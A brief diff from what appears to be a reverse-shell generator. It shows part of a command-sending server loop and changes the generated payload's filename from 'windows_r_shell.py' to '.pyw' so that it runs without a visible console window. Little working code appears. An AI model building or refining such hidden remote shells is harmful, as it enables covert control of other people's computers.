@@ -93,6 +93,7 @@ try:
                                         pass
                                     client.send(cmd.encode())
                                 elif cmd == "cls":
+                                    
                                     try:
                                         clear_scr()
                                         print(banner)
@@ -108,7 +109,7 @@ try:
                             exit()
 
                     main_func()
-                f = open("windows_r_shell.py", "w")
+                f = open("windows_r_shell.pyw", "w")
                 f.write(f'''from getpass import getuser
 from socket import * 
 import subprocess
